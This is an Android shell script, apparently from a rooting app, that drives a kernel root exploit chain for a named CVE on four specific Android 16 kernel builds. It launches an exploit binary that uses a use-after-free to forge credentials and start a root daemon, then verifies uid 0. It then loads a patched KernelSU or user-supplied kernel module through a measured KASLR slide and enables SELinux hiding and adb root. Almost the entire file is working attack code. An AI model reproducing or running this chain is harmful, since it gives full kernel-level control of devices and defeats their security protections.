#!/system/bin/sh
# CVE-2026-98260 complete root chain (opt-in).
# Validated chain: kprobe-free UAF -> fake cred -> rootd -> su98260.
#
# Invoked by $D/run.sh only when MAGICROOT_CHAIN=98260 and
# MAGICROOT_ENABLE_98260=1 (the app sets these after explicit confirmation).
# Success proof: rootd socket exists and su98260 returns uid=0 with
# /proc/self/status Uid/Gid all zero.  The exploit/rootd process is left
# running on success (do not kill it).

set -u

D=/data/local/tmp/magic
SOCK=/data/local/tmp/pc98260-root.sock
LOG=$D/98260.log
VERIFY=$D/98260-verify.log
VERIFY_RAW=$D/98260-verify.raw
KERNEL=$(uname -r 2>/dev/null || echo unknown)

# The rootd client is an interactive sh; its prompt prefixes every line.
# Strip only the prompt so "0" / "Uid: 0 0 0 0" can be parsed reliably.
verify_su() {
    "$SU" -c 'id -u; id -g; getenforce; cat /proc/self/status | grep -E "Uid|Gid"' \
        > "$VERIFY_RAW" 2>&1
    sed 's/^[^#]*# //' "$VERIFY_RAW" > "$VERIFY" 2>/dev/null \
        || cp "$VERIFY_RAW" "$VERIFY"
}

num_or() {
    case "$1" in
        ''|*[!0-9]*) echo "$2" ;;
        *) echo "$1" ;;
    esac
}
ATTEMPTS=$(num_or "${MAGICROOT_98260_ATTEMPTS:-}" 12)
CHURN_ROUNDS=$(num_or "${MAGICROOT_98260_CHURN_ROUNDS:-}" 8)
CHURN_PER_CPU=$(num_or "${MAGICROOT_98260_CHURN_PER_CPU:-}" 32)
WAIT_CAP=$(num_or "${MAGICROOT_98260_WAIT_CAP:-}" 8)
BUDGET=$(num_or "${MAGICROOT_98260_BUDGET_S:-}" 180)
CUSTOM_KO=${MAGICROOT_CUSTOM_KO:-${MAGICROOT_98260_CUSTOM_KO:-}}

echo "98260_CHAIN_BEGIN kernel=$KERNEL time=$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)"

case "$KERNEL" in
    "6.12.58-android16-6-g3a7ac1674240-abogki541502914-4k")
        B=$D/98260 ;;
    "6.12.38-android16-5-gfde7767f6ef6-abogki481467632-4k")
        B=$D/98260-6138 ;;
    "6.12.23-android16-5-g45ea5e4bce8a-abogki445100407-4k")
        B=$D/98260-6123 ;;
    "6.12.38-android16-5-g7ae8ec909e03-abogki471017112-4k")
        B=$D/98260-6138y ;;
    *)
        echo "FAIL=kernel_unsupported actual=$KERNEL"
        echo "98260_CHAIN_END=FAIL code=71"
        exit 71 ;;
esac

if [ -f "$B/target.sh" ]; then
    . "$B/target.sh"
    if [ -n "${CHAIN_98260_KERNEL:-}" ] && [ "$CHAIN_98260_KERNEL" != "$KERNEL" ]; then
        echo "FAIL=target_kernel_mismatch target=$CHAIN_98260_KERNEL actual=$KERNEL dir=$B"
        exit 71
    fi
fi

BIN=$B/exploit-android-key-ptr
SU=$B/pc98260-su
[ -x "$BIN" ] || { echo "FAIL=asset_missing $BIN"; exit 73; }
[ -x "$SU" ] || { echo "FAIL=asset_missing $SU"; exit 73; }

# Read-only preflight mode: only --check, no UAF.
if [ "${MAGICROOT_98260_PREFLIGHT:-0}" = "1" ]; then
    echo "98260_PREFLIGHT=1"
    "$BIN" --check
    RC=$?
    echo "98260_CHAIN_END=PREFLIGHT code=$RC"
    exit "$RC"
fi

# If a live rootd already exists from a previous run, verify it first.
if [ -S "$SOCK" ] && [ -x "$SU" ] && pidof exploit-android-key-ptr >/dev/null 2>&1; then
    verify_su
    if awk '$1 == 0 { found = 1 } END { exit found ? 0 : 1 }' "$VERIFY"; then
        echo "98260_SUCCESS=1 reused=1"
        echo "98260_SU=$SU"
        echo "98260_ROOTD_SOCK=$SOCK"
        cat "$VERIFY"
        echo "98260_CHAIN_END=OK"
        exit 0
    fi
fi

rm -f "$SOCK" 2>/dev/null || true

cd "$D" || exit 74
# Detach into a new session so an interrupted adb shell / app shell cannot
# deliver SIGHUP/SIGTERM to the exploit or its rootd child.  stdin must be
# closed as well: adb's pty would otherwise keep the process tied to the
# session that dies on disconnect.
if command -v setsid >/dev/null 2>&1; then
    SETSID="setsid"
elif [ -x /system/bin/toybox ]; then
    SETSID="/system/bin/toybox setsid"
else
    SETSID=""
fi
if [ -n "$SETSID" ]; then
    $SETSID env \
        PC98260_MAX_ATTEMPTS=$ATTEMPTS \
        PC98260_NO_FALLBACK=1 \
        PC98260_BUDGET_S=$BUDGET \
        PC98260_WAIT_CAP_S=$WAIT_CAP \
        PC98260_CHURN_ROUNDS=$CHURN_ROUNDS \
        PC98260_CHURN_PER_CPU=$CHURN_PER_CPU \
        PC98260_SYNC_LOG=$D/98260.log.sync \
        "$BIN" --no-real-cred < /dev/null >> "$LOG" 2>&1 &
    DETACH_MODE=setsid
else
    nohup env \
        PC98260_MAX_ATTEMPTS=$ATTEMPTS \
        PC98260_NO_FALLBACK=1 \
        PC98260_BUDGET_S=$BUDGET \
        PC98260_WAIT_CAP_S=$WAIT_CAP \
        PC98260_CHURN_ROUNDS=$CHURN_ROUNDS \
        PC98260_CHURN_PER_CPU=$CHURN_PER_CPU \
        PC98260_SYNC_LOG=$D/98260.log.sync \
        "$BIN" --no-real-cred < /dev/null >> "$LOG" 2>&1 &
    DETACH_MODE=nohup
fi
EXEC_PID=$!
echo "98260_EXEC_PID=$EXEC_PID"
echo "98260_DETACH=$DETACH_MODE"
echo "98260_LOG=$LOG"

i=0
while [ "$i" -lt 240 ]; do
    if [ -S "$SOCK" ]; then break; fi
    if ! kill -0 "$EXEC_PID" 2>/dev/null; then
        echo "FAIL=proof exec_exited pid=$EXEC_PID"
        tail -80 "$LOG" 2>/dev/null || true
        echo "98260_CHAIN_END=FAIL code=80"
        exit 80
    fi
    sleep 1
    i=$((i + 1))
done

if [ ! -S "$SOCK" ]; then
    echo "FAIL=proof no_rootd_socket_after_240s pid=$EXEC_PID"
    echo "HINT=do NOT kill; reboot the phone and retry"
    tail -80 "$LOG" 2>/dev/null || true
    echo "98260_CHAIN_END=FAIL code=80"
    exit 80
fi

verify_su
cat "$VERIFY"
if ! awk '$1 == 0 { found = 1 } END { exit found ? 0 : 1 }' "$VERIFY"; then
    echo "FAIL=proof uid_not_zero"
    echo "HINT=rootd process is left running; reboot if repeated"
    echo "98260_CHAIN_END=FAIL code=80"
    exit 80
fi
if ! grep -q '^Uid:[[:space:]]*0[[:space:]]*0[[:space:]]*0[[:space:]]*0' "$VERIFY"; then
    echo "FAIL=proof real_uid_not_zero"
    echo "98260_CHAIN_END=FAIL code=80"
    exit 80
fi
if ! grep -q '^Gid:[[:space:]]*0[[:space:]]*0[[:space:]]*0[[:space:]]*0' "$VERIFY"; then
    echo "FAIL=proof gid_not_zero"
    echo "98260_CHAIN_END=FAIL code=80"
    exit 80
fi

# ---------------------------------------------------------------------------
# Resolve flavor/profile/syms/slide once.  Both the custom KO patch and the
# KernelSU handoff must use the currently selected Flavor's symbols.
# ---------------------------------------------------------------------------
KSU_ENABLE=${MAGICROOT_98260_KSU:-1}
KSU_LOG=$D/98260-ksu.log
ADB_ROOT_98260=${MAGICROOT_ADB_ROOT:-0}
case "$ADB_ROOT_98260" in 1) ;; *) ADB_ROOT_98260=0 ;; esac
KERNEL_UMOUNT_98260=${MAGICROOT_KERNEL_UMOUNT:-1}
case "$KERNEL_UMOUNT_98260" in 1) ;; *) KERNEL_UMOUNT_98260=0 ;; esac
SELINUX_HIDE_98260=${MAGICROOT_SELINUX_HIDE:-1}
case "$SELINUX_HIDE_98260" in 1) ;; *) SELINUX_HIDE_98260=0 ;; esac
ALLOW_SHELL_98260=${MAGICROOT_ALLOW_SHELL:-1}
case "$ALLOW_SHELL_98260" in 1) ;; *) ALLOW_SHELL_98260=0 ;; esac
SU_COMPAT_98260=${MAGICROOT_SU_COMPAT:-1}
case "$SU_COMPAT_98260" in 1) ;; *) SU_COMPAT_98260=0 ;; esac
SU_ENTRY_98260=${MAGICROOT_SU_ENTRY:-1}
case "$SU_ENTRY_98260" in 1) ;; *) SU_ENTRY_98260=0 ;; esac
echo "98260_OPTIONS=allow_shell=$ALLOW_SHELL_98260 su_compat=$SU_COMPAT_98260 su_entry=$SU_ENTRY_98260"
KSU_FLAVOR_LOCAL=$(printf '%s' "${MAGICROOT_KSU_FLAVOR:-}" | tr -d '\r\n')
[ -n "$KSU_FLAVOR_LOCAL" ] || KSU_FLAVOR_LOCAL=$(cat "$D/ksu_flavor" 2>/dev/null | tr -d '\r\n')
[ -n "$KSU_FLAVOR_LOCAL" ] || KSU_FLAVOR_LOCAL=kernelsu
PROFILE_LOCAL=$([ "$KERNEL" = "6.12.38-android16-5-gfde7767f6ef6-abogki481467632-4k" ] && echo 6138 || echo 61258)
CHECK_JSON=$D/98260-check.json
"$BIN" --check > "$CHECK_JSON" 2>/dev/null || true
SLIDE=$(sed -n 's/.*"slide":"\(0x[0-9a-fA-F]*\)".*/\1/p' "$CHECK_JSON" 2>/dev/null | tail -1)
if [ -z "$SLIDE" ]; then
    SLIDE=$(sed -n 's/.*\[slide\] measured \(0x[0-9a-fA-F]*\).*/\1/p' "$LOG" 2>/dev/null | tail -1)
fi
if [ -f "$D/kernel_profiles.sh" ]; then
    . "$D/kernel_profiles.sh" 2>/dev/null || true
fi
KSU_FLAVOR_LOCAL=$(ksu_flavor_normalize "$KSU_FLAVOR_LOCAL" 2>/dev/null || echo kernelsu)
ksu_select_ko "$PROFILE_LOCAL" "$KSU_FLAVOR_LOCAL" 2>/dev/null || true
MGR=$(ksu_flavor_pkg "$KSU_FLAVOR_LOCAL" 2>/dev/null || echo me.weishu.kernelsu)
echo "98260_SYMBOLS=flavor=$KSU_FLAVOR_LOCAL profile=$PROFILE_LOCAL slide=$SLIDE"
[ -n "$SLIDE" ] || echo "98260_SLIDE_MISSING=1"

# ---------------------------------------------------------------------------
# Optional user-supplied kernel module.  SAF has already copied it to a
# device-readable path.  Check ELF / vermagic compatibility, then run the
# selected Flavor's ko_patch before loading the patched output.
# ---------------------------------------------------------------------------
if [ -n "$CUSTOM_KO" ]; then
    CUSTOM_LOG=$D/98260-custom-ko.log
    CUSTOM_PATCHED=$D/98260/custom-patched.ko
    : > "$CUSTOM_LOG" 2>/dev/null || true
    if [ -f "$CUSTOM_KO" ]; then
        MAGIC=$(od -An -tx1 -N4 "$CUSTOM_KO" 2>/dev/null | tr -d ' \n')
        EM=$(od -An -tx1 -j18 -N2 "$CUSTOM_KO" 2>/dev/null | tr -d ' \n')
        VM=$(grep -a -o 'vermagic=[^ ]*' "$CUSTOM_KO" 2>/dev/null | head -1)
        echo "98260_CUSTOM_KO_VERMAGIC=${VM:-unknown} elf=$MAGIC arch=$EM target=$KERNEL" | tee -a "$CUSTOM_LOG"
        if [ "$MAGIC" != "7f454c46" ]; then
            echo "98260_CUSTOM_KO=failed reason=not_elf path=$CUSTOM_KO"
        elif [ -n "$EM" ] && [ "$EM" != "b700" ]; then
            echo "98260_CUSTOM_KO=failed reason=not_aarch64 arch=$EM"
        elif [ -n "$VM" ] && ! printf '%s' "$VM" | grep -q '6\.12'; then
            echo "98260_CUSTOM_KO=failed reason=vermagic_mismatch expected=6.12 actual=$VM"
        elif [ -z "$SLIDE" ] || [ -z "$SYMS" ] || [ ! -f "$SYMS" ] || [ ! -x "$D/ko_patch" ]; then
            echo "98260_CUSTOM_KO=failed reason=patch_inputs_missing slide=$SLIDE syms=$SYMS"
        else
            "$D/ko_patch" "$CUSTOM_KO" "$CUSTOM_PATCHED" "$SYMS" "$SLIDE" "$KERNEL" \
                >> "$CUSTOM_LOG" 2>&1
            PATCH_RC=$?
            PATCH_LINE=$(grep -m1 '^PATCHED=' "$CUSTOM_LOG" 2>/dev/null)
            CUSTOM_MISSING=$(printf '%s\n' "$PATCH_LINE" | sed -n 's/^PATCHED=[0-9]* MISSING=\([0-9][0-9]*\).*/\1/p')
            echo "98260_CUSTOM_KO_PATCH=rc=$PATCH_RC missing=${CUSTOM_MISSING:-none} line=$PATCH_LINE" | tee -a "$CUSTOM_LOG"
            if [ "$PATCH_RC" != "0" ] || [ "${CUSTOM_MISSING:-1}" != "0" ] || [ ! -f "$CUSTOM_PATCHED" ]; then
                echo "98260_CUSTOM_KO=failed reason=ko_patch log=$CUSTOM_LOG"
            elif ! printf '%s\n' "$PATCH_LINE" | grep -Fq "VERMAGIC=$KERNEL SMP"; then
                echo "98260_CUSTOM_KO=failed reason=vermagic_target_mismatch expected=$KERNEL line=$PATCH_LINE"
            else
                echo "98260_CUSTOM_KO_VERMAGIC_MATCH=ok target=$KERNEL" | tee -a "$CUSTOM_LOG"
                printf 'insmod "%s" >/dev/null 2>&1; echo CUSTOM_KO_RC=$?\n' "$CUSTOM_PATCHED" \
                    | "$SU" > "$CUSTOM_LOG" 2>&1
                if grep -q 'CUSTOM_KO_RC=0' "$CUSTOM_LOG" 2>/dev/null; then
                    echo "98260_CUSTOM_KO=loaded path=$CUSTOM_PATCHED source=$CUSTOM_KO"
                else
                    echo "98260_CUSTOM_KO=failed reason=insmod log=$CUSTOM_LOG"
                fi
            fi
        fi
    else
        echo "98260_CUSTOM_KO=missing path=$CUSTOM_KO"
    fi
fi

# ---------------------------------------------------------------------------
# KernelSU handoff (DEFAULT ON; opt-out MAGICROOT_98260_KSU=0).
# ksud late-load first, insmod fallback; ksud comes from the selected Flavor.
# ---------------------------------------------------------------------------
if [ "$KSU_ENABLE" = "1" ]; then
    if grep -q '^kernelsu ' /proc/modules 2>/dev/null; then
        echo "98260_KSU=loaded already"
    elif [ -z "$SLIDE" ] || [ -z "$KO_TEMPLATE" ] || [ ! -f "$KO_TEMPLATE" ] || [ -z "$SYMS" ] || [ ! -f "$SYMS" ] || [ ! -x "$D/ko_patch" ]; then
        echo "98260_KSU=skipped reason=patch_inputs_missing flavor=$KSU_FLAVOR_LOCAL profile=$PROFILE_LOCAL"
    else
        PATCHED=$D/98260/ksu-patched.ko
        : > "$KSU_LOG" 2>/dev/null || true
        "$D/ko_patch" "$KO_TEMPLATE" "$PATCHED" "$SYMS" "$SLIDE" "$KERNEL" >> "$KSU_LOG" 2>&1
        PATCH_RC=$?
        PATCH_LINE=$(grep -m1 '^PATCHED=' "$KSU_LOG" 2>/dev/null)
        KSU_MISSING=$(printf '%s\n' "$PATCH_LINE" | sed -n 's/^PATCHED=[0-9]* MISSING=\([0-9][0-9]*\).*/\1/p')
        echo "98260_KSU_PATCH_RC=$PATCH_RC missing=${KSU_MISSING:-none} flavor=$KSU_FLAVOR_LOCAL profile=$PROFILE_LOCAL template=$(basename "$KO_TEMPLATE")" | tee -a "$KSU_LOG"
        if [ "$PATCH_RC" != "0" ] || [ "${KSU_MISSING:-1}" != "0" ] || [ ! -f "$PATCHED" ]; then
            echo "98260_KSU=failed reason=ko_patch log=$KSU_LOG"
        elif ! printf '%s\n' "$PATCH_LINE" | grep -Fq "VERMAGIC=$KERNEL SMP"; then
            echo "98260_KSU=failed reason=vermagic_target_mismatch expected=$KERNEL line=$PATCH_LINE"
        else
            KSUD=""
            if [ -x "$D/ksud_$KSU_FLAVOR_LOCAL" ]; then
                KSUD="$D/ksud_$KSU_FLAVOR_LOCAL"
                echo "98260_KSUD=selected-manager flavor=$KSU_FLAVOR_LOCAL path=$KSUD"
            elif [ -x "$D/ksud" ]; then
                KSUD=$D/ksud
                echo "98260_KSUD=workdir-fallback path=$KSUD"
            else
                KSUD=/data/adb/ksud
                echo "98260_KSUD=system-fallback path=$KSUD"
            fi
            printf 'mkdir -p /data/adb/ksu/lib && cp %s /data/adb/ksu/lib/android16-6.12_kernelsu.ko && chmod 644 /data/adb/ksu/lib/android16-6.12_kernelsu.ko\n' \
                "$PATCHED" | "$SU" >> "$KSU_LOG" 2>&1
            KSU_METHOD=ksud-late-load
            KSU_ALLOW_ARG=""
            [ "$ALLOW_SHELL_98260" = "1" ] && KSU_ALLOW_ARG=" --allow-shell"
            printf '%s late-load --kmi android16-6.12 --package-name %s%s\n' \
                "$KSUD" "$MGR" "$KSU_ALLOW_ARG" | "$SU" >> "$KSU_LOG" 2>&1
            echo "98260_KSU_ALLOW_SHELL=$ALLOW_SHELL_98260"
            sleep 1
            if ! grep -q '^kernelsu ' /proc/modules 2>/dev/null; then
                KSU_METHOD=insmod-fallback
                printf 'insmod "%s"\n' "$PATCHED" | "$SU" >> "$KSU_LOG" 2>&1
                sleep 1
            fi
            if grep -q '^kernelsu ' /proc/modules 2>/dev/null; then
                echo "98260_KSU=loaded method=$KSU_METHOD flavor=$KSU_FLAVOR_LOCAL"
            else
                echo "98260_KSU=failed method=$KSU_METHOD flavor=$KSU_FLAVOR_LOCAL log=$KSU_LOG"
            fi
        fi
    fi
else
    echo "98260_KSU=disabled"
fi

# Upstream-style manager userspace setup after handoff (best effort).  The
# 98260 reference runs `ksud install` and relaunches the manager after loading
# the LKM; keep it non-fatal because SELinux can make the rootd socket
# unreachable immediately after late-load.
if grep -q '^kernelsu ' /proc/modules 2>/dev/null && [ -n "${KSUD:-}" ] && [ -x "$KSUD" ]; then
    MGR_SETUP_LOG=$D/98260-manager.log
    : > "$MGR_SETUP_LOG" 2>/dev/null || true
    if command -v su >/dev/null 2>&1; then
        su -c "$KSUD install" >> "$MGR_SETUP_LOG" 2>&1
    else
        printf '%s install\n' "$KSUD" | "$SU" >> "$MGR_SETUP_LOG" 2>&1
    fi
    MGR_INSTALL_RC=$?
    echo "98260_KSUD_INSTALL_RC=$MGR_INSTALL_RC"
    if [ "$MGR_INSTALL_RC" = "0" ]; then
        am force-stop "$MGR" >/dev/null 2>&1 || true
        monkey -p "$MGR" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1 || true
        echo "98260_MANAGER_REFRESHED=1 package=$MGR"
    fi
fi

# Default su entry for the 98260 chain.  The 64560 root_stage executes
# su_entry.sh; the 98260 handoff previously ignored MAGICROOT_SU_ENTRY.
# Run it after KSU/manager setup, through the KSU su when available or through
# the still-live rootd client otherwise.  Non-fatal.
if [ "$SU_ENTRY_98260" = "1" ] && [ "$SU_COMPAT_98260" = "1" ] && [ "$KSU_ENABLE" = "1" ] && grep -q '^kernelsu ' /proc/modules 2>/dev/null && [ -f "$D/su_entry.sh" ]; then
    chmod 755 "$D/su_entry.sh" 2>/dev/null || true
    SU_ENTRY_LOG=$D/98260-su-entry.log
    : > "$SU_ENTRY_LOG" 2>/dev/null || true
    if command -v su >/dev/null 2>&1; then
        su -c "sh $D/su_entry.sh" >> "$SU_ENTRY_LOG" 2>&1
        SU_ENTRY_RC=$?
    else
        printf 'sh %s\n' "$D/su_entry.sh" | "$SU" >> "$SU_ENTRY_LOG" 2>&1
        SU_ENTRY_RC=$?
    fi
    cat "$SU_ENTRY_LOG" 2>/dev/null || true
    echo "98260_SU_ENTRY_RC=$SU_ENTRY_RC"
elif [ "$SU_ENTRY_98260" = "1" ] && [ "$SU_COMPAT_98260" != "1" ]; then
    echo "98260_SU_ENTRY=skipped reason=su_compat_disabled"
elif [ "$SU_ENTRY_98260" = "1" ] && { [ "$KSU_ENABLE" != "1" ] || ! grep -q '^kernelsu ' /proc/modules 2>/dev/null; }; then
    echo "98260_SU_ENTRY=skipped reason=ksu_disabled_or_not_loaded"
elif [ "$SU_ENTRY_98260" = "1" ]; then
    echo "98260_SU_ENTRY=skipped reason=missing_script"
else
    echo "98260_SU_ENTRY=disabled"
fi

# Upstream-style cleanup: only after normal su works.  Never kill the plant
# merely because the module is loaded; a broken su would lose the fallback.
# KernelSU feature switches for the 98260 handoff.  These are the same
# ksud feature names used by the 64560 root_stage path.
if [ "$KSU_ENABLE" = "1" ] && grep -q '^kernelsu ' /proc/modules 2>/dev/null; then
    FEATURE_LOG=$D/98260-features.log
    : > "$FEATURE_LOG" 2>/dev/null || true
    FEATURE_KSUD="${KSUD:-/data/adb/ksud}"
    [ -x "$FEATURE_KSUD" ] || FEATURE_KSUD=/data/adb/ksud
    feature_set_98260() {
        _f_name="$1"
        _f_value="$2"
        if command -v su >/dev/null 2>&1; then
            su -c "$FEATURE_KSUD feature set $_f_name $_f_value" >> "$FEATURE_LOG" 2>&1
        else
            printf '%s feature set %s %s\n' "$FEATURE_KSUD" "$_f_name" "$_f_value" \
                | "$SU" >> "$FEATURE_LOG" 2>&1
        fi
        _f_rc=$?
        echo "98260_FEATURE_${_f_name}=${_f_value} rc=${_f_rc}"
    }
    feature_set_98260 kernel_umount "$KERNEL_UMOUNT_98260"
    feature_set_98260 selinux_hide "$SELINUX_HIDE_98260"
    feature_set_98260 adb_root "$ADB_ROOT_98260"
    if [ "$ADB_ROOT_98260" = "1" ]; then
        if command -v su >/dev/null 2>&1; then
            su -c "setprop ctl.restart adbd" >> "$FEATURE_LOG" 2>&1 || true
        else
            printf 'setprop ctl.restart adbd\n' | "$SU" >> "$FEATURE_LOG" 2>&1 || true
        fi
        echo "98260_ADB_ROOT=1 adbd_restart=requested"
    else
        echo "98260_ADB_ROOT=0"
    fi
fi

if [ "$KSU_ENABLE" = "1" ] && grep -q '^kernelsu ' /proc/modules 2>/dev/null; then
    KSU_UID=""
    if command -v su >/dev/null 2>&1; then
        KSU_UID=$(su -c 'id -u' 2>/dev/null | tr -d ' \r\n')
    elif [ -x /data/adb/ksu/bin/su ]; then
        KSU_UID=$(/data/adb/ksu/bin/su -c 'id -u' 2>/dev/null | tr -d ' \r\n')
    fi
    if [ "$KSU_UID" = "0" ]; then
        # Do not SIGKILL the plant: killing its parent reparents a timer-UAF
        # zombie to init, which panics (posix_cpu_timers_exit/rb_next).
        if command -v su >/dev/null 2>&1; then
            su -c "rm -f '$SOCK'" 2>/dev/null || true
        else
            /data/adb/ksu/bin/su -c "rm -f '$SOCK'" 2>/dev/null || true
        fi
        echo "98260_ROOTD_SOFT_CLEANED=1 reason=zombie_reap_panic"
    else
        echo "98260_ROOTD_KEPT reason=no_working_su uid=${KSU_UID:-unknown}"
    fi
else
    echo "98260_ROOTD_KEPT reason=auto_ksu_disabled_or_not_loaded"
fi

echo "98260_SUCCESS=1 reused=0"
echo "98260_EXEC_PID=$EXEC_PID"
echo "98260_ROOTD_SOCK=$SOCK"
echo "98260_SU=$SU"
echo "98260_CHAIN_END=OK"
exit 0
